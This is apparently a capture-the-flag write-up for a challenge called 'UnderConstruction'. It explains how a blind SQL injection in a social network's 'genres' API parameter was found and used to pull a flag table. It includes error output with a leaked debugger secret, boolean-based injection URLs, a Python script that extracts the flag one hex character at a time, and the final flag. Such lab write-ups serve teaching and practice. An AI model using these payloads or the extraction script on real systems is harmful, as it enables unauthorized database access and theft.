<h1 align="center">Writeup for UnderConstruction</h1>

## Idea
We are presented with what seems a normal social network.

If we try to test every single input for SQL injections, by inputting a simple `'`, we find that the only fields where it gives a weird result are `/api/posts/new?genres='` and `/api/posts/popular?genres='`. In fact, we get the following response:
```html
...

<head>
	<title>mysql.connector.errors.ProgrammingError: 1064 (42000): You have an error in your SQL syntax; check the manual
		that corresponds to your MySQL server version for the right syntax to use near &#39;%&#39;
		ORDER BY
		p.posted DESC
		LIMIT 50&#39; at line 17
		// Werkzeug Debugger</title>
	<link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
	<link rel="shortcut icon" href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
	<script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
	<script>
		var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "Z3Q1sSzHd7aMAMy9BY6n";
	</script>
</head>

...
```
This pretty clearly means that the parameter `genres` was not escaped correctly.

Attempting further by adding a `UNION` into the SQL query, we find that we have to do a blind injection since it otherwise returns error:

- Union:
  ```
  http://localhost/api/posts/new?genres=' UNION 1 -- 
  ```
  ```html
  ...

  <head>
      <title>mysql.connector.errors.ProgrammingError: 1064 (42000): You have an error in your SQL syntax; check the manual
          that corresponds to your MySQL server version for the right syntax to use near &#39;1 -- %&#39;
          ORDER BY
          p.posted DESC
          LIMIT 50&#39; at line 17
          // Werkzeug Debugger</title>
      <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
      <link rel="shortcut icon" href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
      <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
      <script>
          var CONSOLE_MODE = false,
              EVALEX = true,
              EVALEX_TRUSTED = false,
              SECRET = "Z3Q1sSzHd7aMAMy9BY6n";
      </script>
  </head>

  ...
  ```
- Blind:
  ```
  http://localhost/api/posts/new?genres=' AND 1=(SELECT 1 FROM information_schema.tables WHERE table_name LIKE 'users') -- 
  ```
  ```json
  {
      "data": [ ... ],
      "status": "OK"
  }
  ```

With this blind injection, if we insert the wrong `SELECT` we can see `data` being an empty array, while if it succeeds it returns a list of posts in the platform.

Now we need to find where the flag is located. Let's attempt with the `flag` table:
```
http://localhost/api/posts/new?genres=' AND 1=(SELECT 1 FROM information_schema.tables WHERE table_name = 'flag') -- 
```
```json
{
    "data": [ ... ],
    "status": "OK"
}
```

Table found. What about the column?
```
http://localhost/api/posts/new?genres=' AND 1=(SELECT 1 FROM information_schema.columns WHERE table_name = 'flag' AND column_name = 'flag') -- 
```
```json
{
    "data": [ ... ],
    "status": "OK"
}
```

It seems there exists the table `flag` with at least the column `flag`. Does it actually contain the flag?
```
http://localhost/api/posts/new?genres=' AND 1=(SELECT 1 FROM flag WHERE flag LIKE 'KSUS{%}') -- 
```
```json
{
    "data": [ ... ],
    "status": "OK"
}
```

Now we know that the flag is located in the `flag` column of the `flag` table.

## Solution
```py
import urllib.parse

import requests

URL = 'http://localhost'
EMAIL = 'email@example.com'
PASSWORD = 'username'

# The HEX() ensures that lowercase and uppercase are respected.
PAYLOAD = """' AND 1=(SELECT 1 FROM flag WHERE HEX(flag) LIKE '{}%') -- """

session = requests.Session()

# Login first.
session.post(f'{URL}/api/login', json={'email': EMAIL, 'password': PASSWORD})

# Now let's attempt the blind injection.
flag = ''
while True:
    for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
        response = session.get(f'{URL}/api/posts/new?genres={urllib.parse.quote(PAYLOAD.format(flag + c))}')
        if len(response.json()['data']) > 0:
            flag += c
            print(f'Hex flag: {flag}')
            break
    else:
        break

print(f'Flag: {bytes.fromhex(flag).decode()}')
```

## Flag
`KSUS{this_is_not_exactly_a_filter_is_it_f83hD32Dkc3hNEey}`